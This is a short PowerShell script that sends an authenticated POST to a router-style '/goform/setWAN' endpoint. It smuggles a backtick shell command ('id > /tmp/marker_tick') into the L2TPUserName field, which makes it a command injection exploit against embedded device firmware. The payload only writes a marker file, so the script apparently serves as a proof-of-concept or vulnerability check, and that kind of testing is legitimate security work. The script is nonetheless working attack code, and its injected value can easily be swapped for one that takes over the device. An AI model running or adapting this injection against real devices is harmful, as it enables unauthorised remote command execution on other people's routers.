param($Target, $Credential)
$body = @{
    wanMode = '6'
    L2TPUserName = '`id > /tmp/marker_tick`'
    'submit-url' = '/wan.asp'
}
Invoke-WebRequest -Uri "$Target/goform/setWAN" -Method POST -Body $body -Credential $Credential
